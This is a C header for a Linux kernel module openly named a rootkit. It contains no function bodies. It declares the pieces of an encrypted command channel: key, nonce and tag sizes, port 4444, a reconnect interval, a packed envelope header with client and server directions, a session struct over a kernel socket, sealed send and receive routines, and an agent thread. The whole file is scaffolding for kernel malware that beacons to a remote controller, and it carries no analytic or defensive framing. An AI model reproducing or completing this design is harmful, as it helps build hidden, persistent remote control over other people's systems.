/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <crypto/aead.h>
#include <linux/net.h>
#include <linux/types.h>

/* ---- Constants ---- */

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_NONCE_LEN	12
#define RK_TAG_LEN	16
#define RK_HDR_LEN	18
#define RK_FRAME_MAX	4096
#define RK_PORT		4444
#define RK_RECONNECT_MS	5000

#define RK_DIR_CLIENT	1
#define RK_DIR_SERVER	2

/* ---- Shared types ---- */

struct rk_envelope_hdr {
	u8 version;
	u8 direction;
	__be64 session_id;
	__be64 sequence;
} __packed;

struct rk_session {
	struct crypto_aead *tfm;
	struct socket *sock;
	u64 session_id;
	u64 tx_seq;
	u64 rx_seq_expected;
};

/* ---- Globals (core/init.c) ---- */

extern u8 rk_key[RK_KEY_LEN];

/* ---- network/protocol.c ---- */

int rk_send_frame(struct socket *sock, const void *buf, size_t len);
int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
		  size_t *out_len);

/* ---- crypto/envelope.c ---- */

int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len);
int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
		   size_t *out_len);

/* ---- network/agent.c ---- */

int rk_agent_thread(void *data);

#endif /* ROOTKIT_H */
